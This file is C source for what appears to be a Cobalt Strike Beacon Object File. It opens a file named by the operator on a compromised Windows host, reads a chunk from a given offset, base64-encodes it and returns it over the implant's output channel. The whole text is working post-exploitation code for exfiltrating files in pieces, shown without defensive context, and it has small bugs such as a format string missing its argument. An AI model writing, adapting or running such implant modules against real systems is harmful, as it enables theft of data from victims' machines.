#include <windows.h>
#include "beacon.h"
 
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptBinaryToStringA(LPVOID, DWORD, DWORD, LPSTR, LPDWORD);

void go(char * args, unsigned long alen) {
    datap  parser;
    BeaconDataParse(&parser, args, alen);

    wchar_t* fileName = (wchar_t*)BeaconDataExtract(&parser, NULL);
    DWORD buffsize = BeaconDataInt(&parser);
    DWORD seekSize = BeaconDataInt(&parser);
    DWORD rplyid = BeaconDataInt(&parser);


    BeaconPrintf(CALLBACK_OUTPUT,"[INFO][%d] BUFFSIZE %d\n", rplyid, buffsize);
    BeaconPrintf(CALLBACK_OUTPUT,"[INFO][%d] SEEKSIZE %d\n", rplyid, seekSize);

    LONG seekResSize = 0;
    DWORD readSize = 0;
    HANDLE hFile;
    
    hFile = KERNEL32$CreateFileW(fileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hFile == INVALID_HANDLE_VALUE){
        BeaconPrintf(CALLBACK_OUTPUT, "[FAIL][%d] OPEN FILE\n", rplyid);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[INFO][%d] OPEN OK!\n");

    if( INVALID_SET_FILE_POINTER == KERNEL32$SetFilePointer(hFile, seekSize, &seekResSize, 0)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] SEEK\n", rplyid);
        KERNEL32$CloseHandle(hFile);
        return;
    }

    LPVOID ReadBuffer = KERNEL32$VirtualAlloc(NULL, buffsize, MEM_COMMIT, PAGE_READWRITE);
    if(NULL == ReadBuffer){
         BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] ALLOC\n", rplyid);
         return;
    }


    if( FALSE == KERNEL32$ReadFile(hFile, ReadBuffer, buffsize, &readSize, NULL) ){
        BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] READ\n", rplyid);
        KERNEL32$CloseHandle(hFile);
        KERNEL32$VirtualFree(ReadBuffer, 0, MEM_RELEASE);
        return;
    }
    KERNEL32$CloseHandle(hFile);

    BeaconPrintf(CALLBACK_OUTPUT,"[INFO][%d] READ OK!\n", rplyid);

    if (readSize > 0 && readSize <= buffsize)
    {        
        DWORD convBuffSize = (readSize*2) + 1;
        LPVOID ReadBufferHex = KERNEL32$VirtualAlloc(NULL, convBuffSize, MEM_COMMIT, PAGE_READWRITE);
        if( FALSE == CRYPT32$CryptBinaryToStringA(ReadBuffer, readSize, CRYPT_STRING_BASE64, ReadBufferHex, &convBuffSize)){
            BeaconPrintf(CALLBACK_OUTPUT,"[FAIL][%d] ENCODE\n", rplyid);
            KERNEL32$VirtualFree(ReadBuffer, 0, MEM_RELEASE);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[DATA][%d] %s", rplyid, ReadBufferHex);
        KERNEL32$VirtualFree(ReadBufferHex, 0, MEM_RELEASE);
    }
    KERNEL32$VirtualFree(ReadBuffer, 0, MEM_RELEASE);
}
